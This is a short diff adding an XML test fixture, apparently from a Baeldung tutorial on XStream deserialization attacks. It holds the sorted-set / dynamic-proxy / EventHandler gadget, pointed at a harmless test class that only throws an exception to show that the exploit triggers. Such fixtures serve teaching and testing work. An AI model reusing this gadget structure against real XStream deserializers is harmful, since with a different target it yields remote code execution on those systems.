@@ -1,0 +1,12 @@
+<sorted-set>
+    <string>foo</string>
+    <dynamic-proxy>
+        <interface>java.lang.Comparable</interface>
+        <handler class="java.beans.EventHandler">
+            <target
+                class='com.baeldung.rce.AttackExploitedExceptionThrower'>
+            </target>
+            <action>throwAttackExploitedException</action>
+        </handler>
+    </dynamic-proxy>
+</sorted-set>
